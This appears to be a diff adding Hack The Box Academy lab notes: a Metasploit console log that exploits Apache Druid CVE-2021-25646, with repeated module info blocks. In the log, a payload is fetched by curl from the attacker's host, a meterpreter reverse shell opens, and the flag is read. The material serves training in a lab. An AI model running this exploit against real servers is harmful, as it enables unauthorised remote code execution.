@@ -818,7 +818,594 @@ Provided by:
   sleepya
   zerosum0x0
   Shadow Brokers
-  Equation Group
+  Equation Group[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> search druid
+
+Matching Modules
+================
+
+   #   Name                                            Disclosure Date  Rank       Check  Description
+   -   ----                                            ---------------  ----       -----  -----------
+   0   exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
+   1     \_ target: Linux (dropper)                    .                .          .      .
+   2     \_ target: Unix (in-memory)                   .                .          .      .
+   3   exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
+   4     \_ target: Automatic                          .                .          .      .
+   5     \_ target: Windows                            .                .          .      .
+   6     \_ target: Linux                              .                .          .      .
+   7   auxiliary/spoof/dns/bailiwicked_domain          2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
+   8   auxiliary/spoof/dns/bailiwicked_host            2008-07-21       normal     Yes    DNS BailiWicked Host Attack
+   9   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
+   10    \_ AKA: Log4Shell                             .                .          .      .
+   11    \_ AKA: LogJam                                .                .          .      .
+   12  exploit/solaris/sunrpc/ypupdated_exec           1994-12-12       excellent  No     Solaris ypupdated Command Execution
+   13  exploit/solaris/dialup/manyargs                 2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
+   14  auxiliary/scanner/telephony/wardial             .                normal     No     Wardialer
+
+
+Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/telephony/wardial
+
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOSTS 10.129.203.52
+RHOSTS => 10.129.203.52
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
+[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload payload/linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Using URL: http://10.10.14.4:8080/3mSWWqB
+[*] Client 10.129.203.52 (curl/7.68.0) requested /3mSWWqB
+[*] Sending payload to 10.129.203.52 (curl/7.68.0)
+[*] Sending stage (3090404 bytes) to 10.129.203.52
+[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.129.203.52:52644) at 2026-05-27 14:37:24 -0400
+[*] Command Stager progress - 100.00% done (110/110 bytes)
+[*] Server stopped.
+
+(Meterpreter 2)(/root/druid) > ps | head
+Filtering on 'head'
+No matching processes were found.
+(Meterpreter 2)(/root/druid) > ps | more
+Filtering on 'more'
+No matching processes were found.
+(Meterpreter 2)(/root/druid) > ps
+
+Process List
+============
+
+ PID   PPID  Name                Arch    User              Path
+ ---   ----  ----                ----    ----              ----
+ 1     0     systemd             x86_64  root              /usr/lib/systemd/systemd
+ 3     2     [rcu_gp]            x86_64  root
+ 4     2     [rcu_par_gp]        x86_64  root
+ 6     2     [kworker/0:0H-kblo  x86_64  root
+             ckd]
+ 9     2     [mm_percpu_wq]      x86_64  root
+ 10    2     [ksoftirqd/0]       x86_64  root
+ 11    2     [rcu_sched]         x86_64  root
+ 12    2     [migration/0]       x86_64  root
+ 13    2     [idle_inject/0]     x86_64  root
+ 14    2     [cpuhp/0]           x86_64  root
+ 15    2     [cpuhp/1]           x86_64  root
+ 16    2     [idle_inject/1]     x86_64  root
+ 17    2     [migration/1]       x86_64  root
+ 18    2     [ksoftirqd/1]       x86_64  root
+ 20    2     [kworker/1:0H-kblo  x86_64  root
+             ckd]
+ 21    2     [kdevtmpfs]         x86_64  root
+ 22    2     [netns]             x86_64  root
+ 23    2     [rcu_tasks_kthre]   x86_64  root
+ 24    2     [kauditd]           x86_64  root
+ 25    2     [khungtaskd]        x86_64  root
+ 26    2     [oom_reaper]        x86_64  root
+ 27    2     [writeback]         x86_64  root
+ 28    2     [kcompactd0]        x86_64  root
+ 29    2     [ksmd]              x86_64  root
+ 30    2     [khugepaged]        x86_64  root
+ 35    2     [kworker/1:1-event  x86_64  root
+             s]
+ 77    2     [kintegrityd]       x86_64  root
+ 78    2     [kblockd]           x86_64  root
+ 79    2     [blkcg_punt_bio]    x86_64  root
+ 80    2     [tpm_dev_wq]        x86_64  root
+ 81    2     [ata_sff]           x86_64  root
+ 82    2     [md]                x86_64  root
+ 83    2     [edac-poller]       x86_64  root
+ 84    2     [devfreq_wq]        x86_64  root
+ 85    2     [watchdogd]         x86_64  root
+ 88    2     [kswapd0]           x86_64  root
+ 89    2     [ecryptfs-kthrea]   x86_64  root
+ 91    2     [kthrotld]          x86_64  root
+ 92    2     [irq/24-pciehp]     x86_64  root
+ 93    2     [irq/25-pciehp]     x86_64  root
+ 94    2     [irq/26-pciehp]     x86_64  root
+ 95    2     [irq/27-pciehp]     x86_64  root
+ 96    2     [irq/28-pciehp]     x86_64  root
+ 97    2     [irq/29-pciehp]     x86_64  root
+ 98    2     [irq/30-pciehp]     x86_64  root
+ 99    2     [irq/31-pciehp]     x86_64  root
+ 100   2     [irq/32-pciehp]     x86_64  root
+ 101   2     [irq/33-pciehp]     x86_64  root
+ 102   2     [irq/34-pciehp]     x86_64  root
+ 103   2     [irq/35-pciehp]     x86_64  root
+ 104   2     [irq/36-pciehp]     x86_64  root
+ 105   2     [irq/37-pciehp]     x86_64  root
+ 106   2     [irq/38-pciehp]     x86_64  root
+ 107   2     [irq/39-pciehp]     x86_64  root
+ 108   2     [irq/40-pciehp]     x86_64  root
+ 109   2     [irq/41-pciehp]     x86_64  root
+ 110   2     [irq/42-pciehp]     x86_64  root
+ 111   2     [irq/43-pciehp]     x86_64  root
+ 112   2     [irq/44-pciehp]     x86_64  root
+ 113   2     [irq/45-pciehp]     x86_64  root
+ 114   2     [irq/46-pciehp]     x86_64  root
+ 115   2     [irq/47-pciehp]     x86_64  root
+ 116   2     [irq/48-pciehp]     x86_64  root
+ 117   2     [irq/49-pciehp]     x86_64  root
+ 118   2     [irq/50-pciehp]     x86_64  root
+ 119   2     [irq/51-pciehp]     x86_64  root
+ 120   2     [irq/52-pciehp]     x86_64  root
+ 121   2     [irq/53-pciehp]     x86_64  root
+ 122   2     [irq/54-pciehp]     x86_64  root
+ 123   2     [irq/55-pciehp]     x86_64  root
+ 124   2     [acpi_thermal_pm]   x86_64  root
+ 125   2     [scsi_eh_0]         x86_64  root
+ 126   2     [scsi_tmf_0]        x86_64  root
+ 127   2     [scsi_eh_1]         x86_64  root
+ 128   2     [scsi_tmf_1]        x86_64  root
+ 130   2     [vfio-irqfd-clea]   x86_64  root
+ 131   2     [ipv6_addrconf]     x86_64  root
+ 141   2     [kstrp]             x86_64  root
+ 144   2     [kworker/u5:0]      x86_64  root
+ 157   2     [charger_manager]   x86_64  root
+ 202   2     [cryptd]            x86_64  root
+ 213   2     [irq/16-vmwgfx]     x86_64  root
+ 217   2     [ttm_swap]          x86_64  root
+ 218   2     [mpt_poll_0]        x86_64  root
+ 223   2     [mpt/0]             x86_64  root
+ 226   2     [scsi_eh_2]         x86_64  root
+ 238   2     [scsi_tmf_2]        x86_64  root
+ 239   2     [scsi_eh_3]         x86_64  root
+ 240   2     [scsi_tmf_3]        x86_64  root
+ 242   2     [scsi_eh_4]         x86_64  root
+ 244   2     [scsi_tmf_4]        x86_64  root
+ 246   2     [scsi_eh_5]         x86_64  root
+ 247   2     [scsi_tmf_5]        x86_64  root
+ 248   2     [scsi_eh_6]         x86_64  root
+ 249   2     [scsi_tmf_6]        x86_64  root
+ 250   2     [scsi_eh_7]         x86_64  root
+ 251   2     [scsi_tmf_7]        x86_64  root
+ 252   2     [scsi_eh_8]         x86_64  root
+ 253   2     [scsi_tmf_8]        x86_64  root
+ 254   2     [scsi_eh_9]         x86_64  root
+ 255   2     [scsi_tmf_9]        x86_64  root
+ 256   2     [scsi_eh_10]        x86_64  root
+ 257   2     [scsi_tmf_10]       x86_64  root
+ 258   2     [scsi_eh_11]        x86_64  root
+ 259   2     [scsi_tmf_11]       x86_64  root
+ 260   2     [scsi_eh_12]        x86_64  root
+ 261   2     [scsi_tmf_12]       x86_64  root
+ 262   2     [scsi_eh_13]        x86_64  root
+ 263   2     [scsi_tmf_13]       x86_64  root
+ 265   2     [scsi_eh_14]        x86_64  root
+ 266   2     [scsi_tmf_14]       x86_64  root
+ 267   2     [scsi_eh_15]        x86_64  root
+ 268   2     [scsi_tmf_15]       x86_64  root
+ 269   2     [scsi_eh_16]        x86_64  root
+ 270   2     [scsi_tmf_16]       x86_64  root
+ 271   2     [scsi_eh_17]        x86_64  root
+ 272   2     [scsi_tmf_17]       x86_64  root
+ 273   2     [scsi_eh_18]        x86_64  root
+ 274   2     [scsi_tmf_18]       x86_64  root
+ 275   2     [scsi_eh_19]        x86_64  root
+ 276   2     [scsi_tmf_19]       x86_64  root
+ 277   2     [scsi_eh_20]        x86_64  root
+ 278   2     [scsi_tmf_20]       x86_64  root
+ 279   2     [scsi_eh_21]        x86_64  root
+ 280   2     [scsi_tmf_21]       x86_64  root
+ 281   2     [scsi_eh_22]        x86_64  root
+ 282   2     [scsi_tmf_22]       x86_64  root
+ 283   2     [scsi_eh_23]        x86_64  root
+ 284   2     [scsi_tmf_23]       x86_64  root
+ 285   2     [scsi_eh_24]        x86_64  root
+ 286   2     [scsi_tmf_24]       x86_64  root
+ 287   2     [scsi_eh_25]        x86_64  root
+ 288   2     [scsi_tmf_25]       x86_64  root
+ 289   2     [scsi_eh_26]        x86_64  root
+ 290   2     [scsi_tmf_26]       x86_64  root
+ 291   2     [scsi_eh_27]        x86_64  root
+ 292   2     [scsi_tmf_27]       x86_64  root
+ 293   2     [scsi_eh_28]        x86_64  root
+ 294   2     [scsi_tmf_28]       x86_64  root
+ 295   2     [scsi_eh_29]        x86_64  root
+ 296   2     [scsi_tmf_29]       x86_64  root
+ 297   2     [scsi_eh_30]        x86_64  root
+ 298   2     [scsi_tmf_30]       x86_64  root
+ 299   2     [scsi_eh_31]        x86_64  root
+ 300   2     [scsi_tmf_31]       x86_64  root
+ 325   2     [kworker/u4:28-eve  x86_64  root
+             nts_power_efficien
+             t]
+ 329   2     [scsi_eh_32]        x86_64  root
+ 330   2     [scsi_tmf_32]       x86_64  root
+ 331   2     [kworker/0:1H-kblo  x86_64  root
+             ckd]
+ 342   2     [kdmflush]          x86_64  root
+ 369   2     [raid5wq]           x86_64  root
+ 413   2     [kworker/1:1H-kblo  x86_64  root
+             ckd]
+ 414   2     [jbd2/dm-0-8]       x86_64  root
+ 415   2     [ext4-rsv-conver]   x86_64  root
+ 472   1     systemd-journald    x86_64  root              /usr/lib/systemd/systemd-journal
+                                                           d
+ 494   2     [ipmi-msghandler]   x86_64  root
+ 504   1     systemd-udevd       x86_64  root              /usr/lib/systemd/systemd-udevd
+ 519   1     systemd-networkd    x86_64  systemd-network   /usr/lib/systemd/systemd-network
+                                                           d
+ 637   2     [kaluad]            x86_64  root
+ 638   2     [kmpath_rdacd]      x86_64  root
+ 639   2     [kmpathd]           x86_64  root
+ 640   2     [kmpath_handlerd]   x86_64  root
+ 641   1     multipathd          x86_64  root              /usr/sbin/multipathd
+ 649   2     [jbd2/sda2-8]       x86_64  root
+ 650   2     [ext4-rsv-conver]   x86_64  root
+ 663   1     systemd-timesyncd   x86_64  systemd-timesync  /usr/lib/systemd/systemd-timesyn
+                                                           cd
+ 682   1     VGAuthService       x86_64  root              /usr/bin/VGAuthService
+ 683   1     vmtoolsd            x86_64  root              /usr/bin/vmtoolsd
+ 703   1     accounts-daemon     x86_64  root              /usr/lib/accountsservice/account
+                                                           s-daemon
+ 704   1     dhclient            x86_64  root              /usr/sbin/dhclient
+ 707   1     dbus-daemon         x86_64  messagebus        /usr/bin/dbus-daemon
+ 714   1     irqbalance          x86_64  root              /usr/sbin/irqbalance
+ 717   1     python3             x86_64  root              /usr/bin/python3.8
+ 718   1     polkitd             x86_64  root              /usr/lib/policykit-1/polkitd
+ 719   1     rsyslogd            x86_64  syslog            /usr/sbin/rsyslogd
+ 722   1     systemd-logind      x86_64  root              /usr/lib/systemd/systemd-logind
+ 725   1     udisksd             x86_64  root              /usr/lib/udisks2/udisksd
+ 739   2     [kworker/1:5-event  x86_64  root
+             s]
+ 759   1     ModemManager        x86_64  root              /usr/sbin/ModemManager
+ 850   1     systemd-resolved    x86_64  systemd-resolve   /usr/lib/systemd/systemd-resolve
+                                                           d
+ 893   1     freshclam           x86_64  clamav            /usr/bin/freshclam
+ 899   1     cron                x86_64  root              /usr/sbin/cron
+ 906   1     python3             x86_64  root              /usr/bin/python3.8
+ 908   1     atd                 x86_64  root              /usr/sbin/atd
+ 920   1     perl                x86_64  root              /usr/bin/perl
+ 925   1     sshd                x86_64  root              /usr/sbin/sshd
+ 933   1     agetty              x86_64  root              /usr/sbin/agetty
+ 944   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 945   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 946   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 947   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 948   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 949   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 1154  1     snort               x86_64  snort             /usr/sbin/snort
+ 2104  2     [kworker/u4:0-even  x86_64  root
+             ts_power_efficient
+             ]
+ 2105  2     [kworker/0:0-event  x86_64  root
+             s]
+ 2108  2     [kworker/0:1-event  x86_64  root
+             s]
+ 2262  2     [kworker/u4:1-even  x86_64  root
+             ts_power_efficient
+             ]
+ 2309  2     [kworker/1:0-event  x86_64  root
+             s]
+ 2396  945   sh                  x86_64  root              /usr/bin/dash
+ 2399  2396  axjZtKpt            x86_64  root              /tmp/axjZtKpt
+
+(Meterpreter 2)(/root/druid) > migrate 1
+[-] The "migrate" command is not supported by this Meterpreter type (x64/linux)
+(Meterpreter 2)(/root/druid) > cd ..
+(Meterpreter 2)(/root) > ls
+Listing: /root
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
+100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
+040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
+040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
+100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
+100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
+040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
+100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
+040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
+100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
+100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
+040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap
+
+(Meterpreter 2)(/root) > cat flag.txt 
+HTB{MSF_Expl01t4t10n}
+(Meterpreter 2)(/root) > 
+
 
 Module side effects:
  unknown-side-effects
@@ -1900,3 +2487,591 @@ Besides these, of course, there are a plethora of other payloads out there. Some
 Answer the question(s) below to complete the section
 
 Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
+```
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> search druid
+
+Matching Modules
+================
+
+   #   Name                                            Disclosure Date  Rank       Check  Description
+   -   ----                                            ---------------  ----       -----  -----------
+   0   exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
+   1     \_ target: Linux (dropper)                    .                .          .      .
+   2     \_ target: Unix (in-memory)                   .                .          .      .
+   3   exploit/multi/http/apache_druid_cve_2023_25194  2023-02-07       excellent  Yes    Apache Druid JNDI Injection RCE
+   4     \_ target: Automatic                          .                .          .      .
+   5     \_ target: Windows                            .                .          .      .
+   6     \_ target: Linux                              .                .          .      .
+   7   auxiliary/spoof/dns/bailiwicked_domain          2008-07-21       normal     Yes    DNS BailiWicked Domain Attack
+   8   auxiliary/spoof/dns/bailiwicked_host            2008-07-21       normal     Yes    DNS BailiWicked Host Attack
+   9   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
+   10    \_ AKA: Log4Shell                             .                .          .      .
+   11    \_ AKA: LogJam                                .                .          .      .
+   12  exploit/solaris/sunrpc/ypupdated_exec           1994-12-12       excellent  No     Solaris ypupdated Command Execution
+   13  exploit/solaris/dialup/manyargs                 2001-12-12       good       No     System V Derived /bin/login Extraneous Arguments Buffer Overflow
+   14  auxiliary/scanner/telephony/wardial             .                normal     No     Wardialer
+
+
+Interact with a module by name or index. For example info 14, use 14 or use auxiliary/scanner/telephony/wardial
+
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> use 0
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
